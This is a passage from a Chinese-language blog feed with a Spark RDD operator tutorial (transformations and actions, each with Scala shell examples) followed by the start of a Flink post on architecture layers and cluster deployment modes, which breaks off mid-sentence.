to 5,2)</span><br><span class="line">first.map(1 to _).collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629361687877-18444583-2032-4606-b1c2-59d7a858da27.png"></p><h4 id="（2）flatMap"><a href="#（2）flatMap" class="headerlink" title="（2）flatMap"></a>（2）flatMap</h4><p>给定一个二维的输入（线式输入），将返回的所有结果打平成一个一维的集合结构（点式集合输出）;</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">val first = sc.parallelize(1 to 5,2)</span><br><span class="line">first.flatMap(1 to _).collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629361925095-d5967335-e5d8-4136-b9dc-40aeaf574e03.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">val first = sc.parallelize(List(&quot;one&quot;,&quot;two&quot;,&quot;three&quot;),2)</span><br><span class="line">first.flatMap(x =&gt;List(x,x,x)).collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629362079746-1298c815-0023-41a3-9c3c-d3adf7f565c4.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">val first = sc.parallelize(List(&quot;one&quot;,&quot;two&quot;,&quot;three&quot;),2)</span><br><span class="line">first.flatMap(x =&gt; List(x+&quot;_1&quot;,x+&quot;_2&quot;,x+&quot;_3&quot;)).collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629362222555-086c43f1-848f-4990-9fbd-d369bdb90f42.png"></p><h4 id="（3）mapPartitions"><a href="#（3）mapPartitions" class="headerlink" title="（3）mapPartitions"></a>（3）mapPartitions</h4><p>以分区为单位进行计算处理；</p><p>在map过程中，需要频繁创建额外对象时，如文件输出流操作、jdbc操作、socket操作，使用mapPartitions算子；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">val rdd = sc.parallelize(Seq(1,2,3,4,5),3)</span><br><span class="line">var rdd2 = rdd.mapPartitions(partition =&gt; &#123;</span><br><span class="line">// 在此处可以加入jdbc一次初始化多少次使用的代码</span><br><span class="line">partition.map(num =&gt; num * num)</span><br><span class="line">&#125;)</span><br><span class="line">rdd2.max</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629362591147-55198903-ddac-4824-9735-ad45e0648084.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">val rdd = sc.parallelize(Seq(1,2,3,4),3)</span><br><span class="line">var rdd2 = rdd.mapPartitions(partition =&gt;&#123;</span><br><span class="line">partition.flatMap(1 to _)</span><br><span class="line">&#125;)</span><br><span class="line">rdd2.count</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629362787238-09fde06d-4c8a-4a76-bf4f-81cd63d4888d.png"></p><h4 id="（4）glom"><a href="#（4）glom" class="headerlink" title="（4）glom"></a>（4）glom</h4><p>以分区为单位，将每个分区的值形成一个数组；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">val a = sc.parallelize(Seq(&quot;one&quot;,&quot;two&quot;,&quot;three&quot;,&quot;four&quot;,&quot;five&quot;),3)</span><br><span class="line">a.glom.collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629362965109-f019c760-0cca-48e7-b77e-72a72b865c73.png"></p><p>由上诉得到：分组的依据是平均分组</p><h4 id="（5）union"><a href="#（5）union" class="headerlink" title="（5）union"></a>（5）union</h4><p>将2个rdd合并成一个rdd，不去重；有时可能会发生多个分区合并成一个分区的情况。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">val a = sc.parallelize(1 to 4,2)</span><br><span class="line">val b = sc.parallelize(6 to 10,2)</span><br><span class="line">a.union(b).collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629363148863-5e326e0c-8090-44dc-9235-fc502b1b020d.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(a union b).collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629363185922-78c5a488-f745-423f-ba9f-5a1a8aed72f0.png"></p><h4 id="（6）groupBy"><a href="#（6）groupBy" class="headerlink" title="（6）groupBy"></a>（6）groupBy</h4><p>输入分区和输出分区 n : n型</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">val a = sc.parallelize(Seq(1,2,3,4,5,56,67),3)</span><br><span class="line">a.groupBy(x =&gt; &#123;if(x&gt;10) &quot;&gt;10&quot; else &quot;&lt;=10&quot;&#125;).collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629363353742-3a6f1e5a-9e2b-4830-aa7a-6746670268cf.png"></p><h4 id="（7）filter"><a href="#（7）filter" class="headerlink" title="（7）filter"></a>（7）filter</h4><p>输出为输入的子集；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">val a = sc.parallelize(1 to 4,3)</span><br><span class="line">val b = a.filter(_%4 == 0)</span><br><span class="line">b.collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629363470345-d3527b6f-d8cc-4cda-9075-5295be2fc72f.png"></p><h4 id="（8）distinct"><a href="#（8）distinct" class="headerlink" title="（8）distinct"></a>（8）distinct</h4><p>输出分区为输入分区的子集，全局去重；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">val a = sc.parallelize(1 to 3,3)</span><br><span class="line">val b = sc.parallelize(2 to 9,3)</span><br><span class="line">a.union(b).distinct().collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629363723963-576ad83b-d590-475d-81b6-09e20703585d.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">val c = sc.parallelize(List(&quot;小红&quot;,&quot;消化&quot;,&quot;不良&quot;,&quot;消化&quot;))</span><br><span class="line">c.distinct.collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629363870738-97f17c6b-c2c6-4145-be17-a744e0697ecb.png"></p><h4 id="（9）cache"><a href="#（9）cache" class="headerlink" title="（9）cache"></a>（9）cache</h4><p>cache将rdd元素从磁盘缓存到内存中，数据反复被使用的场景使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">val a = sc.parallelize(1 to 3,2)</span><br><span class="line">val b = sc.parallelize(2 to 4,2)</span><br><span class="line">a.union(b).count</span><br><span class="line">a.distinct().collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629365250564-1438ac38-78bf-4c84-b7c5-1337feebeeca.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">val a = sc.parallelize(1 to 3,2)</span><br><span class="line">val b = sc.parallelize(2 to 5,3)</span><br><span class="line">val c = a.union(b).cache</span><br><span class="line">c.count</span><br><span class="line">c.distinct().collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629365410401-cff04c88-5a41-4aa0-a8cd-3d9bc4f8c045.png"></p><h3 id="3-1-2-key-value型转换算子"><a href="#3-1-2-key-value型转换算子" class="headerlink" title="3.1.2 key-value型转换算子"></a>3.1.2 key-value型转换算子</h3><h4 id="（1）mapValues"><a href="#（1）mapValues" class="headerlink" title="（1）mapValues"></a>（1）mapValues</h4><p>输入分区：输出分区 &#x3D; 1 ： 1</p><p>针对key-value型数据中的value进行map操作，而不对key进行处理；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">val first = sc.parallelize(List((&quot;张三&quot;,1),(&quot;李四&quot;,2),(&quot;王五&quot;,3)),2)</span><br><span class="line">val second = first.mapValues(x =&gt; x+1)</span><br><span class="line">second.collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629366240118-49f73664-486d-4acd-a779-46fe1aa28042.png"></p><h4 id="（2）★-combineByKey-★"><a href="#（2）★-combineByKey-★" class="headerlink" title="（2）★ combineByKey ★"></a>（2）★ combineByKey ★</h4><p>定义</p><p>def combineByKey [C] (</p><p>createCombiner: (V) &#x3D;&gt; C,</p><p>mergeValue: (C,V) &#x3D;&gt; C,</p><p>mergeCombiners: (C,C) &#x3D;&gt; C): RDD[(String, C)]</p><p>元素</p><p>createCombiner对每个分区内的同组元素如何聚合，形成一个累加器</p><p>mergeValue 将累加器与新遇到的值进行合并的方法</p><p>mergeCombiners 每个分区都是独立处理，故同一个键可以有多个累加器。如果两个或者多个分区都对应同一个键的累加器，用方法将各个分区的结果进行合并。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">val first = sc.parallelize(List((&quot;张一&quot;,4),(&quot;张一&quot;,2),(&quot;张三&quot;,3)),2)</span><br><span class="line">val second =first.combineByKey(List(_), (x:List[Int],y:Int) =&gt; y::x, (x:List[Int], y:List[Int]) =&gt; x:::y)</span><br><span class="line">second.collect </span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629367854547-9a9fa874-7f66-4d7d-a216-a511bfb5b502.png"></p><h4 id="（3）reduceByKey"><a href="#（3）reduceByKey" class="headerlink" title="（3）reduceByKey"></a>（3）reduceByKey</h4><p>按key聚合后对组进行规约处理，求和</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">val first = sc.parallelize(List(&quot;小米&quot;,&quot;华为&quot;,&quot;小米&quot;,&quot;华硕&quot;,&quot;很郁闷&quot;),2)</span><br><span class="line">val second = first.map(x =&gt; (x,1))</span><br><span class="line">second.reduceByKey(_+_).collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629370722139-e07aa367-7b31-4818-a81e-fb58087606bf.png"></p><h4 id="（4）join"><a href="#（4）join" class="headerlink" title="（4）join"></a>（4）join</h4><p>对 key-value 结构的rdd进行按key的join操作，最后将V部分做flatMap打平操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">val first = sc.parallelize(List((&quot;张三&quot;,11),(&quot;李四&quot;,12)),2)</span><br><span class="line">val seconed = sc.parallelize(List((&quot;张一&quot;,2),(&quot;李二&quot;,3),(&quot;李四&quot;,3)),3)</span><br><span class="line">first.join(seconed).collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629371167534-5d370cc0-f9b8-4785-a30a-f89d51d0d802.png"></p><h2 id="3-2-行动算子-action"><a href="#3-2-行动算子-action" class="headerlink" title="3.2 行动算子 action"></a>3.2 行动算子 action</h2><p>该类型算子会触发SparkContext提交作业，触发RDD DAG的执行</p><h4 id="（1）无输出型，不落地本地文件或hsfs文件"><a href="#（1）无输出型，不落地本地文件或hsfs文件" class="headerlink" title="（1）无输出型，不落地本地文件或hsfs文件"></a>（1）无输出型，不落地本地文件或hsfs文件</h4><p>foreach算子</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">val first = sc.parallelize(List(&quot;小米&quot;,&quot;华为&quot;,&quot;华米&quot;,&quot;小米&quot;,&quot;苹果&quot;,&quot;华米&quot;,&quot;三星&quot;),2)</span><br><span class="line">first.foreach(println _)</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629371520895-6d080f91-c686-4d4f-9dfa-514612d51c7e.png"></p><h4 id="（2）HDFS输出型"><a href="#（2）HDFS输出型" class="headerlink" title="（2）HDFS输出型"></a>（2）HDFS输出型</h4><p>saveAsTextFile算子</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">val first = sc.parallelize(List(&quot;小米&quot;,&quot;华为&quot;,&quot;三星&quot;,&quot;华为&quot;),2)</span><br><span class="line">// 指定本地保存的目录(不存在的目录)</span><br><span class="line">first.saveAsTextFile(&quot;file:///home/shijiaxin/spark_output5&quot;)</span><br><span class="line">=====================================</span><br><span class="line">===        BUG               ========</span><br><span class="line">=====================================</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629378669316-8304be2d-269b-453c-9b8b-7e7f16265a81.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">=================killed==================</span><br><span class="line"></span><br><span class="line">// 指定保存hdfs保存目录，默认路径hdfs中/user/当前用户</span><br><span class="line">first.saveAsTextFile(&quot;spark_shell_output_txt&quot;)</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629372362391-1dfc078a-4ead-4c9d-8ffa-6f748a04ef61.png"></p><h4 id="（3）scala集合和数据类型"><a href="#（3）scala集合和数据类型" class="headerlink" title="（3）scala集合和数据类型"></a>（3）scala集合和数据类型</h4><p>collect算子</p><p>相当于toArray操作，将分布式RDD返回成为一个scala array数组结果，实际是Driver所在的机器节点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">val first = sc.parallelize(List(&quot;小米&quot;, &quot;华为&quot;, &quot;花粉&quot;,  &quot;苹果&quot; ), 2)</span><br><span class="line">first.collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629373371312-99b79ad2-7b62-4fbe-89d1-470a492d60ec.png"></p><h4 id="（4）collectAsMap算子"><a href="#（4）collectAsMap算子" class="headerlink" title="（4）collectAsMap算子"></a>（4）collectAsMap算子</h4><p>相当于 toMap 操作，将分布式 RDD的 kv 对形式，返回成为一个 scala map集合，实际上Driver所在的机器节点，在处理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">val first = sc.parallelize(List((&quot;张一&quot;,1),(&quot;礼仪&quot;,1),(&quot;张一&quot;,3),(&quot;白虎&quot;,3)),2)</span><br><span class="line">first.collectAsMap</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629373634686-a0154efc-0222-4cae-9f7a-6b288f90d852.png"></p><h4 id="（5）lookup算子"><a href="#（5）lookup算子" class="headerlink" title="（5）lookup算子"></a>（5）lookup算子</h4><p>对键值对类型的 RDD操作，返回指定key对应的元素形成的Seq</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">val first = sc.parallelize(List(&quot;小米&quot;,&quot;爱华为&quot;,&quot;爱尔兰&quot;,&quot;cs&quot;),2)</span><br><span class="line">val second = first.map(x =&gt; (&#123;if (x.contains(&quot;爱&quot;)) &quot;有爱&quot; else &quot;无爱&quot;&#125;, x))</span><br><span class="line">second.lookup(&quot;有爱&quot;)</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629373958406-9e27c6d8-7109-47ca-a073-30376d225f0d.png"></p><h4 id="（6）reduce算子"><a href="#（6）reduce算子" class="headerlink" title="（6）reduce算子"></a>（6）reduce算子</h4><p>先对两个元素进行reduce函数操作，然后将结果和迭代器取出的下一个元素进行reduce函数操作，直到迭代器遍历完所有元素,得到最后结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">val a = sc.parallelize(1 to 3, 3)</span><br><span class="line">a.reduce(_+_)</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629375707373-e049fe20-3095-484c-88c9-214f8c84ea39.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">val a = sc.parallelize(List((&quot;one&quot;,1),(&quot;two&quot;,2),(&quot;three&quot;,3)),3)（最后的3 代表3个分区）</span><br><span class="line">val a = sc.parallelize(List((&quot;one&quot;,1),(&quot;two&quot;,2),(&quot;three&quot;,3)),2)</span><br><span class="line">a.reduce( (x,y) =&gt;(&quot;sum&quot;, x._2 + y._3))._2  // 此处不能为3（代表元组的第二列）</span><br><span class="line">a.reduce( (x,y)=&gt;(&quot;sum&quot;,x._2+y._2))._2</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629376091510-d07bf1c2-a468-4864-b43f-8c28f45d46e7.png"></p><h4 id="（7）fold算子fold算子："><a href="#（7）fold算子fold算子：" class="headerlink" title="（7）fold算子fold算子："></a>（7）fold算子fold算子：</h4><p>def fold (zeroValue: T)(op: (T, T) &#x3D;&gt; T) : T</p><p>先对rdd分区的每一个分区进行op函数</p><p>在调用op函数过程中将zeroValue参与计算</p><p>最后在对所有分区的结果调用op函数，同事在此处进行zeroValue再次参与计算</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 和是41 公式：（1+2+3+4+5+6+10）+10</span><br><span class="line">sc.parallelize(List(1,2,3,4,5,6),1).fold(10)(_+_)</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/image-20230221120323612.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 和是51 公式：（1+2+3+10）+（4+5+6+10）+10 </span><br><span class="line">sc.parallelize(List(1,2,3,4,5,6),2).fold(10)(_+_)</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/image-20230221120533230.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 和是61 公式：（1+2+10）+（3+4+10）+（5+6+10）+10 </span><br><span class="line">sc.parallelize(List(1,2,3,4,5,6),3).fold(10)(_+_)</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/image-20230221120553144.png"></p><h1 id="四：其他常用算子"><a href="#四：其他常用算子" class="headerlink" title="四：其他常用算子"></a>四：其他常用算子</h1><ul><li>cartesian算子</li><li>subtract算子</li><li>sample算子</li><li>takeSample算子</li><li>persist算子</li><li>cogroup算子</li><li>leftOuterJoin算子</li><li>rightOuterJoin算子</li><li>saveAsObjectFile算子</li><li>count算子</li><li>top算子</li><li>aggregate算子</li></ul>]]></content>
      
      
      <categories>
          
          <category> Spark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flink 架构设计</title>
      <link href="/blog/50ac08de.html/"/>
      <url>/blog/50ac08de.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：Flink-架构设计图"><a href="#一：Flink-架构设计图" class="headerlink" title="一：Flink 架构设计图"></a>一：Flink 架构设计图</h1><p><img src="/blog/50ac08de.html/1630318437801-84613c7b-a14d-4311-b66b-9b3ac56824bd.png"></p><h2 id="1-1-分层设计说明"><a href="#1-1-分层设计说明" class="headerlink" title="1.1 分层设计说明"></a>1.1 分层设计说明</h2><ul><li>物理部署层 -deploy层<ul><li>负责解决Flink的部署模式问题</li><li>支持多种部署模式：本地部署、集群部署（standalone&#x2F;yarn&#x2F;mesos）、云（GCE&#x2F;EC2）以及 kubernetes 。</li><li>通过该层支持不同平台的部署，用户可以根据自身场景和需求使用对应的部署模式；</li></ul></li><li>Runtime核心层<ul><li>是Flink分布式计算框架的核心实现层，负责对上层不同接口提供基础服务。</li><li>支持分布式steam作业的执行、jobGraph到ExecutionGraph的映射转换以及任务调度等。</li><li>将DataStream和DataSet转成统一的可执行的Task Operator，达到在流式计算引擎下同时处理批量计算和流式计算的目的。</li></ul></li><li>API &amp; Libraries 层<ul><li>负责更好的开发用户体验，包括易用性、开发效率、执行效率、状态管理等方面。</li><li>Flink同时提供了支撑流计算和批处理的接口，同时在这基础上抽象出不同的应用类型的组件库，如：<ul><li>基于流处理的CEP（复杂事件处理库）</li><li>Table &amp; Sql库</li><li>基于批处理的FlinkML（机器学习库）</li><li>图处理库(Gelly)</li></ul></li><li>API层包括两部分<ul><li>流计算应用的DataStream API</li><li>批处理应用的DataSet API</li><li>统一的API，方便用于直接操作状态和时间等底层数据<ul><li>提供了丰富的数据处理高级API，例如Map、FllatMap操作等</li><li>并提供了比较低级的Process Function API</li></ul></li></ul></li></ul></li></ul><h1 id="二：运行模式"><a href="#二：运行模式" class="headerlink" title="二：运行模式"></a>二：运行模式</h1><h2 id="2-1-运行模式核心区分点"><a href="#2-1-运行模式核心区分点" class="headerlink" title="2.1 运行模式核心区分点"></a>2.1 运行模式核心区分点</h2><ul><li>集群生命周期和资源隔离保证</li><li>应用程序的main()方法是在客户端还是在集群上执行</li></ul><h2 id="2-2-所有模式分类说明"><a href="#2-2-所有模式分类说明" class="headerlink" title="2.2 所有模式分类说明"></a>2.2 所有模式分类说明</h2><ul><li>本地运行模式</li><li>standalone模式</li><li>集群运行模式<ul><li>经常是指flink on yarn集群模式</li><li>yarn也可以换成mesos,Kubernetes(k8s)等资源管理平台替换</li><li>共三种<ul><li>session 模式</li><li>per-job 模式</li><li>application 模式</li></ul></li></ul></li></ul><h2 id="2-3-本地运行模式"><a href="#2-3-本地运行模式" class="headerlink" title="2.3 本地运行模式"></a>2.3 本地运行模式</h2><ul><li>运行过程：一个机器启动一个进程的多线程来模拟分布式计算。</li><li>主要用于代码测试</li></ul><h2 id="2-4-standalone模式"><a href="#2-4-standalone模式" class="headerlink" title="2.4 standalone模式"></a>2.4 standalone模式</h2><ul><li>运行过程：完全独立的Flink集群的模式，各个环节均Flink自己搞定。并没有yarn、mesos的统一资源调度平台。</li><li>主要是只有纯Flink纯计算的场景，商用场景极少。</li></ul><h2 id="2-5-集群运行模式"><a href="#2-5-集群运行模式" class="headerlink" title="2.5 集群运行模式"></a>2.5 集群运行模式</h2><h3 id="（1）Flink-Session-集群（会话模式）"><a href="#（1）Flink-Session-集群（会话模式）" class="headerlink" title="（1）Flink Session 集群（会话模式）"></a>（1）Flink Session 集群（会话模式）</h3><ul><li><ul><li>集群生命周期：<ul><li>在 Flink Session 集群中，客户端连接到一个预先存在的、长期运行的集群；</li><li>该集群可以接受多个作业提交。即使所有作业完成后，集群（和 JobManager）仍将继续运行直到手动停止 session 为止。</li><li>因此，<code>Flink Session 集群的寿命不受任何 Flink 作业寿命的约束</code>。</li></ul></li><li>TaskManager slot 由 ResourceManager 在提交作业时分配，并在作业完成时释放。<ul><li>由于所有作业都共享同一集群，因此在集群资源方面存在一些竞争——例如提交工作阶段的网络带宽。</li><li>此共享设置的局限性在于，如果 TaskManager 崩溃，则在此 TaskManager 上运行 task 的所有作业都将失败；</li><li>再比如，如果 JobManager 上发生一些致命错误，它将影响集群中正在运行的所有作业。</li></ul></li><li>其他注意事项：<ul><li>拥有一个预先存在的集群可以节省大量时间申请资源和启动 TaskManager。</li><li>有种场景很重要，作业执行时间短并且启动时间长会对端到端的用户体验产生负面的影响。<ul><li>就像对简短查询的交互式分析一样，希望作业可以使用现有资源快速执行计算。</li></ul></li></ul></li><li>Flink Session 集群也被称为 session 模式下的 Flink 集群。</li><li>工作模式<ul><li>附加模式（默认）<ul><li>特点<ul><li>客户端与Flink作业集群相互同步</li></ul></li><li>细节描述<ul><li>yarn-session.sh 客户端将 Flink 集群提交给 YARN，但客户端保持运行，跟踪集群的状态。</li><li>如果集群失败，客户端将显示错误。如果客户端被终止，它也会通知集群关闭。</li></ul></li></ul></li><li>分离模式（-d或–detached）<ul><li>特点<ul><li>客户端与Flink作业集群相互异步，客户端提交完成后即可退出</li></ul></li><li>细节描述<ul><li>yarn-session.sh 客户端将Flink集群提交给YARN，然后客户端返回。</li><li>需要再次调用客户端或 YARN 工具来停止 Flink 集群。</li></ul></li></ul></li></ul></li><li>工作流程特征说明<ul><li>多个不同的FlinkJob向同一个Flink Session会话上提交作业，由这一个统一个的FlinkSession管理所有的Flink作业。</li><li>工作流程示意图</li></ul></li></ul></li><li><p><img src="/blog/50ac08de.html/1630323312227-b12cae9d-16c2-47b1-a1cf-e697d719c689.png"></p></li></ul><h3 id="（2）Flink-Job-集群（per-job模式）"><a href="#（2）Flink-Job-集群（per-job模式）" class="headerlink" title="（2）Flink Job 集群（per-job模式）"></a>（2）Flink Job 集群（per-job模式）</h3><ul><li>Flink Job 集群也被称为 job (or per-job) 模式下的 Flink 集群。</li><li>集群生命周期：<ul><li>在 Flink Job 集群中，可用的集群管理器（例如 YARN）用于为每个提交的作业启动一个集群，并且该集群仅可用于该作业。</li><li>在这里客户端首先从集群管理器请求资源启动 JobManager，然后将作业提交给在这个进程中运行的 Dispatcher。然后根据作业的资源请求惰性的分配 TaskManager。</li><li>一旦作业完成，Flink Job 集群将被拆除。</li></ul></li><li>资源隔离：<ul><li>JobManager 中的致命错误仅影响在 Flink Job 集群中运行的一个作业。</li></ul></li><li>其他注意事项：<ul><li>由于 ResourceManager 必须应用并等待外部资源管理组件来启动 TaskManager 进程和分配资源，所以其实时计算性并没有session模式强</li><li>因此 Flink Job 集群更适合长期运行、具有高稳定性要求且对较长的启动时间不敏感的大型作业；</li></ul></li><li>工作流程特征说明：<ul><li>多个不同的FlinkJob向各自由统一资源管理器(Yarn)生成的专用Flink Session会话上提交作业，由作业所属的FlinkSession管理自己的Flink作业。</li><li>工作流程示意图</li></ul></li></ul><p><img src="/blog/50ac08de.html/1630323597224-1c423290-947a-44b4-9101-7adce28b5202.png"></p><h3 id="（3）Flink-Application-集群（应用模式）"><a href="#（3）Flink-Application-集群（应用模式）" class="headerlink" title="（3）Flink Application 集群（应用模式）"></a>（3）Flink Application 集群（应用模式）</h3><ul><li>Flink Job 集群可以看做是 Flink Application 集群”客户端运行“的替代方案。</li><li>该模式为yarn session和yarn per-job模式的折中选择。</li><li>集群生命周期：<ul><li>Flink Application 集群是与Flink作业执行直接相关的运行模式，并且 <code>main()方法在集群上而不是客户端上运行</code>。</li><li>提交作业是一个单步骤过程：<ul><li>无需先启动 Flink 集群，然后将作业提交到现有的 session 集群。</li><li>将应用程序逻辑和依赖打包成一个可执行的作业 JAR 中，由入口机客户端提交jar包和相关资源到hdfs当中。</li><li>由调度启动的集群当中JobManager来拉取已由上一步上传完成的运行代码所需要的所有资源。</li><li>如果有JobManager HA设置的话，将会同时启动多个JobManager作HA保障，此时将面临JobManager的选择，最终由一个胜出的JobManager作为Active进程推进下边的执行。</li><li>由运行JobManager进程的集群入口点节点机器（ApplicationClusterEntryPoint）负责调用 main()方法来提取 JobGraph，即作为用户程序的解析和提交的客户端程序与集群进行交互，直到作业运行完成。</li><li>如果一个main()方法中有多个env.execute()&#x2F;executeAsync()调用，在Application模式下，这些作业会被视为属于同一个应用，在同一个集群中执行（如果在Per-Job模式下，就会启动多个集群）</li><li>该模式也允许我们像在 Kubernetes 上部署任何其他应用程序一样部署 Flink 应用程序。</li><li>因此，Flink Application 集群的寿命与 Flink 应用程序的寿命有关。</li></ul></li></ul></li><li>资源隔离：<ul><li>在 Flink Application 集群中，ResourceManager 和 Dispatcher 作用于单个的 Flink 应用程序，相比于 Flink Session 集群，它提供了更好的隔离。</li></ul></li><li>工作流程特征说明：<ul><li>将各个环节更进一步进行专用化处理，相当于每个FlinkJob都有一套专用的服务角色进程。</li></ul></li></ul><h3 id="（4）总结"><a href="#（4）总结" class="headerlink" title="（4）总结"></a>（4）总结</h3><ul><li>应用场景<ul><li>本地布署模式：demo、代码测试场景。</li><li>Session模式：集群资源充分、频繁任务提交、小作业居多、实时性要求高的场景。(该模式较少）</li><li>Per-Job模式：作业少、大作业、实时性要求低的场景。</li><li>Application模式：实时性要求不太高、安全性有一定要求均可以使用，普遍适用性最强。</li></ul></li><li>生产环境使用说明<ul><li>建议用per-job或是application模式，提供了更好的资源隔离性和安全性。</li></ul></li></ul><h1 id="三：运行流程"><a href="#三：运行流程" class="headerlink" title="三：运行流程"></a>三：运行流程</h1><h2 id="3-1-工作流程图"><a href="#3-1-工作流程图" class="headerlink" title="3.1 工作流程图"></a>3.1 工作流程图</h2><p><img src="/blog/50ac08de.html/1630324699314-e7922476-6b00-4315-894e-e9d794163070.png"></p><h2 id="3-2-运行时核心角色组成"><a href="#3-2-运行时核心角色组成" class="headerlink" title="3.2 运行时核心角色组成"></a>3.2 运行时核心角色组成</h2><ul><li>由两种类型的进程组成，一个 JobManager 和一个或者多个 